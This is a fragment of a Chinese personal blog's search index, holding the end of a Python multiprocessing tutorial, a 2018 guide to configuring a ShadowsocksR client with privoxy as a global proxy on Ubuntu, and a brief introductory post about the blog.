class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Parent process <span class="number">30834.</span></span><br><span class="line">Run task <span class="number">0</span> (<span class="number">30835</span>)...</span><br><span class="line">Run task <span class="number">1</span> (<span class="number">30836</span>)...</span><br><span class="line">Run task <span class="number">2</span> (<span class="number">30837</span>)...</span><br><span class="line">Run task <span class="number">3</span> (<span class="number">30838</span>)...</span><br><span class="line">Task <span class="number">2</span> runs <span class="number">0.78</span> seconds.</span><br><span class="line">Run task <span class="number">4</span> (<span class="number">30837</span>)...</span><br><span class="line">Task <span class="number">0</span> runs <span class="number">0.88</span> seconds.</span><br><span class="line">Task <span class="number">4</span> runs <span class="number">0.12</span> seconds.</span><br><span class="line">Task <span class="number">3</span> runs <span class="number">0.99</span> seconds.</span><br><span class="line">Task <span class="number">1</span> runs <span class="number">1.41</span> seconds.</span><br><span class="line">All subprocesses done.</span><br></pre></td></tr></table></figure></p><p>结果也是相同的。</p><p>感觉这样的风格，更加pythonic。</p><h2 id="进程间通信"><a href="#进程间通信" class="headerlink" title="进程间通信"></a>进程间通信</h2><p>在自己的第二个任务中，还涉及到多个进程想要访问同一个内存空间。但是程序却老出错，或者跑不动。</p><p>在Python中，多个进程之间通信，是需要专门的类和方式去实现的。</p><p>在<code>multiprocessing</code>模块中封装了很多类去实现数据交换，常用的如<code>Queue</code>，<code>Pipe</code>。下面就是用<code>Queue</code>实现一个简单的读写队列。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 代码来自廖雪峰博客</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Queue</span><br><span class="line"><span class="keyword">import</span> os, time, random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写数据进程执行的代码:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(q)</span>:</span></span><br><span class="line"> print(<span class="string">'Process to write: %s'</span> % os.getpid())</span><br><span class="line"> <span class="keyword">for</span> value <span class="keyword">in</span> [<span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>]:</span><br><span class="line"> print(<span class="string">'Put %s to queue...'</span> % value)</span><br><span class="line"> q.put(value)</span><br><span class="line"> time.sleep(random.random())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读数据进程执行的代码:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(q)</span>:</span></span><br><span class="line"> print(<span class="string">'Process to read: %s'</span> % os.getpid())</span><br><span class="line"> <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"> value = q.get(<span class="keyword">True</span>)</span><br><span class="line"> print(<span class="string">'Get %s from queue.'</span> % value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line"> <span class="comment"># 父进程创建Queue，并传给各个子进程：</span></span><br><span class="line"> q = Queue()</span><br><span class="line"> pw = Process(target=write, args=(q,))</span><br><span class="line"> pr = Process(target=read, args=(q,))</span><br><span class="line"> <span class="comment"># 启动子进程pw，写入:</span></span><br><span class="line"> pw.start()</span><br><span class="line"> <span class="comment"># 启动子进程pr，读取:</span></span><br><span class="line"> pr.start()</span><br><span class="line"> <span class="comment"># 等待pw结束:</span></span><br><span class="line"> pw.join()</span><br><span class="line"> <span class="comment"># pr进程里是死循环，无法等待其结束，只能强行终止:</span></span><br><span class="line"> pr.terminate()</span><br></pre></td></tr></table></figure></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001431927781401bb47ccf187b24c3b955157bb12c5882d000" target="_blank" rel="noopener">多进程</a><br><a href="http://www.dongwm.com/archives/%E4%BD%BF%E7%94%A8Python%E8%BF%9B%E8%A1%8C%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B-%E8%BF%9B%E7%A8%8B%E7%AF%87/" target="_blank" rel="noopener">理解Python并发编程一篇就够了 - 进程篇</a></p>]]></content>
      
      
        <tags>
            
            <tag> multi-progress </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Ubuntu 纸飞机起飞</title>
      <link href="/2018/12/10/Ubuntu-%E7%BA%B8%E9%A3%9E%E6%9C%BA%E8%B5%B7%E9%A3%9E/"/>
      <content type="html"><![CDATA[<hr><h2 id="2018-7-10"><a href="#2018-7-10" class="headerlink" title="2018.7.10"></a>2018.7.10</h2><p>在安装好Ubuntu后，因为想使用Chrome，在登录的时候发现要先break wall一下。</p><p>这时候我觉得需要设置个全局的ssr代理。因此，才有了下面的过程。</p><a id="more"></a><p><strong>1. 下载SSR客户端</strong></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/ssrbackup/shadowsocksr</span><br></pre></td></tr></table></figure><p><strong>2. 配置SSR的配置文件</strong></p><p>进入刚刚复制下来的文件夹，里面有一个<code>config.json</code>的文件，将它复制一份并命名为<code>config.json.backup</code>作为备份。</p><p>打开<code>config.json</code>文件，对里面的一些参数进行修改。</p><p>主要有以下几项</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"server"</span>: <span class="string">"0.0.0.0"</span>,   <span class="meta"># SSR服务器的IP地址</span></span><br><span class="line">    <span class="string">"server_port"</span>: <span class="number">8388</span>,   <span class="meta"># SSR服务器的端口</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"password"</span>: <span class="string">"m"</span>,       <span class="meta"># SSR服务器的密码</span></span><br><span class="line">    <span class="string">"method"</span>: <span class="string">"aes-128-ctr"</span>,   <span class="meta"># 加密方法</span></span><br><span class="line">    <span class="string">"protocol"</span>: <span class="string">"auth_aes128_md5"</span>,  <span class="meta"># 协议</span></span><br><span class="line">    <span class="string">"protocol_param"</span>: <span class="string">""</span>,           <span class="meta"># 协议参数</span></span><br><span class="line">    <span class="string">"obfs"</span>: <span class="string">"tls1.2_ticket_auth_compatible"</span>,  <span class="meta"># 混淆协议</span></span><br><span class="line">    <span class="string">"obfs_param"</span>: <span class="string">""</span>,   <span class="meta"># 混淆参数</span></span><br><span class="line"></span><br><span class="line">    <span class="meta"># 以上这些主要是SSR服务商提供的</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3. 运行SSR</strong></p><p>在当前目录下，运行一下命令</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python3</span> shadowsocks/local.<span class="keyword">py</span></span><br></pre></td></tr></table></figure><p>如果看到以下输出，就没啥大问题了。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">IPv6</span> <span class="selector-tag">support</span></span><br><span class="line">2018<span class="selector-tag">-07-09</span> 11<span class="selector-pseudo">:04</span><span class="selector-pseudo">:56</span> <span class="selector-tag">INFO</span>     <span class="selector-tag">util</span><span class="selector-class">.py</span><span class="selector-pseudo">:85</span> <span class="selector-tag">loading</span> <span class="selector-tag">libcrypto</span> <span class="selector-tag">from</span> <span class="selector-tag">libcrypto</span><span class="selector-class">.so</span><span class="selector-class">.1</span><span class="selector-class">.1</span></span><br><span class="line">2018<span class="selector-tag">-07-09</span> 11<span class="selector-pseudo">:04</span><span class="selector-pseudo">:56</span> <span class="selector-tag">INFO</span>     <span class="selector-tag">local</span><span class="selector-class">.py</span><span class="selector-pseudo">:50</span> <span class="selector-tag">local</span> <span class="selector-tag">start</span> <span class="selector-tag">with</span> <span class="selector-tag">protocol</span><span class="selector-attr">[auth_aes128_md5]</span> <span class="selector-tag">password</span> <span class="selector-attr">[b'm']</span> <span class="selector-tag">method</span> <span class="selector-attr">[aes-128-ctr]</span> <span class="selector-tag">obfs</span> <span class="selector-attr">[tls1.2_ticket_auth_compatible]</span> <span class="selector-tag">obfs_param</span> <span class="selector-attr">[]</span></span><br><span class="line">2018<span class="selector-tag">-07-09</span> 11<span class="selector-pseudo">:04</span><span class="selector-pseudo">:56</span> <span class="selector-tag">INFO</span>     <span class="selector-tag">local</span><span class="selector-class">.py</span><span class="selector-pseudo">:54</span> <span class="selector-tag">starting</span> <span class="selector-tag">local</span> <span class="selector-tag">at</span> 127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span><span class="selector-pseudo">:1080</span></span><br><span class="line">2018<span class="selector-tag">-07-09</span> 11<span class="selector-pseudo">:04</span><span class="selector-pseudo">:56</span> <span class="selector-tag">INFO</span>     <span class="selector-tag">asyncdns</span><span class="selector-class">.py</span><span class="selector-pseudo">:324</span> <span class="selector-tag">dns</span> <span class="selector-tag">server</span>: <span class="selector-attr">[('127.0.0.53', 53)]</span></span><br></pre></td></tr></table></figure><p>接下来就是如何利用privoxy设置全局代理</p><p><strong>4. 安装<code>privoxy</code></strong></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt <span class="keyword">install</span> privoxy</span><br></pre></td></tr></table></figure><p><strong>5. 配置<code>privoxy</code></strong></p><p>安装后，打开<code>/etc/privoxy/config</code>，把这两句注释掉（具体位置在4.2部分的前面两句）：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># <span class="selector-tag">listen-address</span>  127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span><span class="selector-pseudo">:8118</span></span><br><span class="line"># <span class="selector-tag">listen-address</span>  <span class="selector-attr">[::1]</span><span class="selector-pseudo">:8118</span></span><br></pre></td></tr></table></figure><p>在文件的最后加上：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">forward-socks5 / <span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>:<span class="number">1080</span> .</span><br><span class="line">listen-addresss <span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>:<span class="number">8118</span></span><br></pre></td></tr></table></figure><p>一定要注意第一行最后的<strong>点</strong></p><hr><p>最后就是设置系统的代理，打开Ubuntu的设置。</p><p>在左侧导航栏找到<strong>网络</strong></p><p>设置网络代理（network proxy），选择“手动(Manual)”</p><p><strong>删掉最后一栏的内容</strong>。</p><p>把前4栏都设置成<strong>IP:127.0.0.1,端口：8118</strong></p><hr><p>现在试一下登录chrome就成功了</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/c336fd0bdfbe" target="_blank" rel="noopener">Linux 配置SSR 客户端</a><br><a href="https://kinoko3.github.io/2017/10/18/shadowsocsR-privoxy-liunx%E4%B8%8B%E4%BD%BF%E7%94%A8SSR%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86/" target="_blank" rel="noopener">shadowsocsR+privoxy liunx下使用SSR全局代理</a></p><h2 id="2018-7-14-更新"><a href="#2018-7-14-更新" class="headerlink" title="2018.7.14 更新"></a>2018.7.14 更新</h2><p>这两天在看Ubuntu美化时，发现了另外同样也是配置SSR脚本的方法。</p><p>这里也再介绍一下，给大家提供不同的参考意见。</p><p>这里使用的时Charles的脚本。</p><p><a href="https://github.com/ZR-Huang/CharlesScripts/blob/master/charles/bin/ssr?1531550203091" target="_blank" rel="noopener">脚本地址</a></p><p>1.直接复制脚本，并在本地保存名为<code>ssr</code>的文件。<br>2.修改其中<code>ssr_start()</code>函数，在<code>sleep 1</code>之前加入：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gsettings set org<span class="selector-class">.gnome</span><span class="selector-class">.system</span><span class="selector-class">.proxy</span><span class="selector-class">.http</span> host <span class="string">'127.0.0.1'</span></span><br><span class="line">gsettings set org<span class="selector-class">.gnome</span><span class="selector-class">.system</span><span class="selector-class">.proxy</span><span class="selector-class">.http</span> port <span class="number">1080</span></span><br><span class="line">gsettings set org<span class="selector-class">.gnome</span><span class="selector-class">.system</span><span class="selector-class">.proxy</span> mode <span class="string">'manual'</span></span><br></pre></td></tr></table></figure><p>3.在<code>ssr_stop()</code>里，在<code>sudo python3 local.py -d stop</code>之前加入：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gsettings set org<span class="selector-class">.gnome</span><span class="selector-class">.system</span><span class="selector-class">.proxy</span> mode <span class="string">'auto'</span></span><br></pre></td></tr></table></figure><p>4.修改该文件的权限，并把他放到用户本地的命令目录里面，这样下次可以直接输命令调用比较方便。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="number">700</span> ssr</span><br><span class="line">sudo mv ssr <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span></span><br></pre></td></tr></table></figure><p>5.在命令行里面运行</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssr install # 等待安装完毕</span><br><span class="line">ssr<span class="built_in"> config </span># 填入自己的ssr配置</span><br><span class="line"><span class="comment"># 如果你没有自己的ssr服务器，也可以用 ssr update这个命令，会自己下载配置文件</span></span><br><span class="line">ssr start # 启动ssr</span><br></pre></td></tr></table></figure><h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/35362159" target="_blank" rel="noopener">Ubuntu17.10／Ubuntu18.04配置以及美化</a></p>]]></content>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> ssr </tag>
            
            <tag> breakwall </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>写在开头</title>
      <link href="/2018/12/09/%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2/"/>
      <content type="html"><![CDATA[<p>其实吧，在今年的一月份的时候，我就用Git Pages搭过一个博客。</p><p>可能是出于还不明白自己到底想要通过博客去实现什么？</p><p>在花了近一年的时间，在知乎，简书以及公众号上断断续续地发文，我想我现在已经摸索到了一点自己想要的东西所在的方位。</p><p>在这一年中，我看到过一句话，给我留下非常深刻的印象，大意是：<strong>在实现目标的过程中，不断地去跟别人强调自己在做什么以及自己的进度的人，往往实现不了目标</strong>。</p><p>这一年来自己多多少少也算是走南闯北了，经历了不少的事情。</p><p>昨天给一个在美国的老友说了一声生日祝福，她说：“你看起来老了很多”。</p><p>哈哈哈哈哈，毕竟上年纪了呀。</p><p>嘘～🤫，接下来，就让我们静静等待2019年的来临。</p><p>看看这个博客，会发生神奇的变化吧。</p>]]></content>
      
      
        <tags>
            
            <tag> about-myself </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
